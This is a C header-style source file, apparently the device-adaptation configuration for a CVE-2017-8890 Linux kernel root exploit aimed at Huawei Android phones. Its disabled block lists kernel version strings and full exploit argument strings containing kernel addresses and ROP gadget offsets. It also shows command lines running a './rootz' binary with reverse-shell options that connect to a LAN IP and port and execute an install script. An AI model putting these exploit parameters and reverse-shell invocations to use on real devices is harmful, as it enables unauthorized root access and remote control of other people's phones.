/*
 * CVE-2017-8890 exploit adp args
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */

#include "param.h"

/* 

  通用内核函数地址定义在 param.h 头文件中
  
  针对不同手机适配需要特殊定义的，在该头文件中定义

*/

char *adp_set_task_name = "xxoo";

#if 0

适配信息 

/* huawei p10 */
Linux version 4.1.18-gfd75bbb (android@localhost) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Mar 2 17:29:20 CST 2017

"n=1002&k=[101=0xffffffc001de7ad0;102=0x40;104=0xffffffc00198efc0;105=0x78;201=0xffffffc0000f7f2c;]&j=[0x60000003e=0x600000326;0x600000376=0xffffffc000f54e14;0x600000136=0xffffffc0005b5844;0x60000013e=0xffffffc001de7b08;0x6000000d6=0x600000326;0x6000000de=0xffffffc000f490f0;0x600000346=0xffffffc00060d0d0;0x6000004de=0x600000226;0x60000028e=0xffffffc00010314c;0x0=0x0;0xc100020=0x0c100100;0x0c100100=0xffffffc000f2eff4;0xc100108=0x0c100200;0xc100228=0x0c100300;0xc100348=0xffffffc0007d5788;0xc1002b0=0xffffffc001980000;0xc100378=0x0c100400;0xc100428=0xffffffc0001e91a4;0x0=0x0;]&p=[0xffffffc001d99b14=0x0=0x4;]"
if test reverse shell:

&r=[901=192.168.0.106;902=4000;903=/data/local/tmp/install.sh;


HWVTR:/ $ cat /proc/version                                                    
Linux version 4.1.18-gf5b4220 (android@localhost) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Wed Apr 12 03:17:23 CST 2017

./data/local/tmp/rootz "n=1003&k=[101=0xffffffc001dfbaf8;102=0x40;104=0xffffffc001996fc0;105=0x78;109=0x8;201=0xffffffc0000f8348;]&j=[0x60000003e=0x600000326;0x600000376=0xffffffc000f58fb0;0x600000136=0xffffffc0005b8210;0x60000013e=0xffffffc001dfbb30;0x6000000d6=0x600000326;0x6000000de=0xffffffc000f4d28c;0x600000346=0xffffffc00060e848;0x6000004de=0x600000226;0x60000028e=0xffffffc00010356c;0x0=0x0;0xc100020=0x0c100100;0x0c100100=0xffffffc000f331a4;0xc100108=0x0c100200;0xc100228=0x0c100300;0xc100348=0xffffffc0007d7fb0;0xc1002b0=0xffffffc001988000;0xc100378=0x0c100400;0xc100428=0xffffffc0001e97ac;0x0=0x0;]&p=[0xffffffc001dabb54=0x0=0x4;0xffffffc001dfbb38=0xffffffc00054b744=0x8;]&r=[901=192.168.199.213;902=8989;903=/data/local/tmp/install.sh;]"


/* huawei NEM-TL00 */ ro.product.model=hi6250
Linux localhost 3.10.90-g1e8f015 #1 SMP PREEMPT Fri Jan 20 03:30:14 CST 2017 aarch64
Linux version 3.10.90-g1e8f015 (android@localhost) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Fri Jan 20 03:30:14 CST 2017

./rootz "n=1002&k=[101=0xffffffc001674b10;102=0x40;104=0xffffffc00135c860;105=0x70;201=0xffffffc00020a6dc;]
&j=[0x600000046=0x600000066;0x600000066=0xffffffc000205528;0x60000006e=0x600000026;0x60000007e=0x600000426;0x600000076=0x600000226;0x60000003e=0x600000526;0x6000000b6=0x600000126;0x600000436=0xffffffc000348508;0x6000005b6=0x600000026;0x60000015e=0x600000126;0x60000005e=0xffffffc001674b30;0x6000002a6=0x600000226;0x60000023e=0xffffffc000121328;0x600000256=0xffffffc000105ec8;0x0=0x0;0x0c1000b8=0xffffffc000ab07c4;0x0c1000c0=0x0c100000;0x0c100028=0x0c100300;0x0c100348=0xffffffc0001abec4;0x0=0x0;]&p=[0xffffffc00193a1bc=0x0=0x4;]"

if test reverse shell:

&r=[901=192.168.0.135;902=4000;903=/data/local/tmp/install.sh;]

#endif
